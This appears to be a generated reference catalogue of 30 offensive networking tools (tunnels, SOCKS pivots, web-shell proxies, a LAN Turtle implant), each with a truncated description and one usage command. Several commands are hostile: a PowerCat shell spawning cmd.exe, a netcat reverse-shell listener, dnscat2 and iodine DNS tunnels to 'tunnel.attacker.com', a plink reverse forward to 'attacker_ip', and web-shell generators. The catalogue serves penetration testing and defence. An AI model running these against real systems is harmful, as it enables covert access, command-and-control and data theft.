# Network, Wireless, Cloud & Containers
> Source: HackTools | Entries: 30 | Platform: cross_platform


## Index

- [hardware_hacking](#hardwarehacking)
- [packet_crafting](#packetcrafting)
- [proxy](#proxy)
- [tunneling](#tunneling)
- [web_application_testing](#webapplicationtesting)


### hardware_hacking

#### LAN Turtle
Hak5 covert network implant disguised as a USB Ethernet adapter that provides persistent remote access, network recon...
**Categories:** hardware_hacking, physical_security, network_implant, persistent_access, mitm
```
turtle set-module responder start
```

### packet_crafting

#### THC-IPv6
IPv6 attack toolkit containing a collection of tools designed to exploit weaknesses in the IPv6 protocol suite includ...
**Categories:** packet_crafting, network_security, ipv6_security, layer2_attacks, mitm
```
alive6 eth0
```

### proxy

#### mitmproxy
Interactive TLS-capable intercepting HTTP proxy for traffic analysis, modification, and replay. Detectable through pr...
**Categories:** proxy, traffic_interception, web_application_testing
```
mitmproxy --listen-port 8080 --mode transparent
```

#### proxychains-ng
Dynamic library preloading tool that forces arbitrary applications to route TCP connections through SOCKS4/5 or HTTP...
**Categories:** proxy, pivoting, socks_proxy, traffic_routing, post_exploitation
```
proxychains4 nmap -sT -Pn 10.10.10.0/24
```

### tunneling

#### ABPTTS
A Black Path Toward The Sun - TCP tunneling over HTTP/HTTPS via webshell with robust encryption and traffic obfuscati...
**Categories:** tunneling, web_shell, http_tunnel, encrypted_tunnel, port_forwarding, post_exploitation
```
python abpttsfactory.py -o webshell.aspx
```

#### bore
Minimal TCP tunnel tool written in Rust for exposing local ports through a remote server. Lightweight alternative to...
**Categories:** tunneling, port_forwarding, nat_traversal, service_exposure
```
bore local 8080 --to bore.pub
```

#### Chisel
Fast TCP/UDP tunnel over HTTP, used for creating encrypted reverse SOCKS proxies and port forwards through restrictiv...
**Categories:** tunneling, pivoting, socks_proxy, port_forwarding, post_exploitation
```
chisel server --reverse --port 8080
```

#### dnscat2
Command and control tool that tunnels data through DNS queries and responses. Creates encrypted C2 channels using DNS...
**Categories:** tunneling, dns_tunnel, command_and_control, data_exfiltration, covert_channel
```
ruby dnscat2.rb tunnel.attacker.com
```

#### earthworm
Portable network tunneling tool (also known as 'ew') supporting SOCKS proxy and multi-level port forwarding across Li...
**Categories:** tunneling, socks_proxy, port_forwarding, pivoting, apt_tool, post_exploitation
```
ew -s ssocksd -l 1080
```

#### frp
Fast reverse proxy tool for exposing internal services behind NAT/firewalls to the internet. Supports TCP, UDP, HTTP,...
**Categories:** tunneling, reverse_proxy, nat_traversal, port_forwarding, socks_proxy, service_exposure
```
frps -c frps.ini
```

#### gTunnel
gRPC-based tunneling tool using protocol buffers over HTTP/2 for creating reverse tunnels and SOCKS proxies. Leverage...
**Categories:** tunneling, grpc_tunnel, socks_proxy, port_forwarding, http2_tunnel
```
gtunnel server -p 443
```

#### Invoke-SocksProxy
PowerShell-based SOCKS proxy implementation enabling pivoting through compromised Windows hosts without deploying ext...
**Categories:** tunneling, socks_proxy, powershell, pivoting, living_off_the_land
```
Import-Module .\Invoke-SocksProxy.psm1; Invoke-SocksProxy -bindPort 1080
```

#### iodine
IP-over-DNS tunnel that encapsulates IPv4 traffic within DNS queries, enabling full network connectivity through DNS...
**Categories:** tunneling, dns_tunnel, ip_over_dns, firewall_bypass, covert_channel
```
iodined -f -c -P password 10.0.0.1 tunnel.attacker.com
```

#### lcx
Classic Windows port forwarding tool used for TCP port redirection. One of the earliest and most widely used pivoting...
**Categories:** tunneling, port_forwarding, pivoting, post_exploitation, legacy_tool
```
lcx.exe -listen 4444 33389
```

#### ligolo-ng
Advanced tunneling tool using TUN interfaces to create transparent network pivots without SOCKS. Establishes encrypte...
**Categories:** tunneling, pivoting, network_routing, post_exploitation, tun_interface
```
ligolo-ng proxy -selfcert -laddr 0.0.0.0:11601
```

#### Neo-reGeorg
Upgraded version of reGeorg with encryption, header customization, and improved evasion. Tunnels SOCKS5 traffic throu...
**Categories:** tunneling, web_shell, socks_proxy, http_tunnel, encrypted_tunnel, post_exploitation
```
python neoreg.py generate -k password123 -o webshells/
```

#### netcat
Versatile networking utility (nc/ncat) for reading/writing data across TCP/UDP connections. Ubiquitous in offensive o...
**Categories:** tunneling, reverse_shell, port_forwarding, network_utility, file_transfer
```
nc -lvnp 4444
```

#### ngrok
Commercial tunneling service exposing local services to the internet via ngrok cloud infrastructure. Provides instant...
**Categories:** tunneling, service_exposure, nat_traversal, cloud_tunnel, command_and_control
```
ngrok http 8080
```

#### plink
PuTTY Link command-line SSH client for Windows, commonly abused for creating SSH tunnels, reverse port forwards, and...
**Categories:** tunneling, ssh_tunnel, port_forwarding, pivoting, post_exploitation
```
plink.exe -ssh -l user -pw password -R 9999:127.0.0.1:3389 attacker_ip
```

#### PowerCat
PowerShell implementation of netcat providing TCP/UDP networking capabilities natively in PowerShell. Used for revers...
**Categories:** tunneling, reverse_shell, powershell, port_forwarding, living_off_the_land
```
powercat -l -p 4444 -e cmd.exe
```

#### rathole
Lightweight and high-performance reverse proxy for NAT traversal, written in Rust. Exposes internal services through...
**Categories:** tunneling, reverse_proxy, nat_traversal, port_forwarding, service_exposure
```
rathole server -c server.toml
```

#### reGeorg
Web shell-based SOCKS proxy that tunnels traffic through HTTP/HTTPS via a deployed web shell on a compromised web ser...
**Categories:** tunneling, web_shell, socks_proxy, http_tunnel, post_exploitation
```
python reGeorgSocksProxy.py -p 8080 -u http://target/tunnel.aspx
```

#### rpivot
Reverse SOCKS proxy tool enabling tunneling of traffic through a compromised machine via a reverse connection. Design...
**Categories:** tunneling, pivoting, socks_proxy, reverse_proxy, post_exploitation
```
python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-port 1080
```

#### SharpSocks
C# reverse SOCKS proxy tunneling traffic through HTTP/HTTPS for .NET environments. Creates a SOCKS proxy on the attac...
**Categories:** tunneling, socks_proxy, http_tunnel, reverse_proxy, dotnet, post_exploitation
```
SharpSocksServer.exe -s http://0.0.0.0:8080 -c http://0.0.0.0:8081 --socksport 1080
```

#### socat
Multipurpose relay and network utility capable of creating bidirectional data channels between virtually any combinat...
**Categories:** tunneling, port_forwarding, relay, reverse_shell, network_utility
```
socat TCP-LISTEN:8080,fork TCP:internal_host:80
```

#### SSHuttle
Transparent proxy server that creates a VPN-like tunnel over SSH, routing all traffic for specified subnets through a...
**Categories:** tunneling, pivoting, ssh_tunnel, vpn_alternative, transparent_proxy
```
sshuttle -r user@pivot_host 10.10.0.0/24
```

#### Stowaway
Multi-hop proxy tool designed for penetration testers to build node-based proxy chains through multiple compromised h...
**Categories:** tunneling, pivoting, multi_hop_proxy, socks_proxy, port_forwarding, post_exploitation
```
stowaway admin -l 9999 -s secretkey
```

#### Tunna
HTTP tunnel tool wrapping TCP connections within HTTP, enabling tunneling of any TCP service through web server websh...
**Categories:** tunneling, web_shell, http_tunnel, port_forwarding, post_exploitation
```
python proxy.py -u http://target/conn.aspx -l 4444 -r 3389 -a 10.0.0.5
```

### web_application_testing

#### Burp Suite
Integrated web application security testing platform used for intercepting, modifying, and replaying HTTP/HTTPS traff...
**Categories:** web_application_testing, proxy, vulnerability_scanner
```
java -jar burpsuite_pro.jar --project-file=target.burp
```

#### ZAP
OWASP Zed Attack Proxy is an open-source web application security scanner that acts as a man-in-the-middle proxy. Det...
**Categories:** web_application_testing, proxy, vulnerability_scanner
```
zap.sh -daemon -port 8080 -config api.key=changeme
```
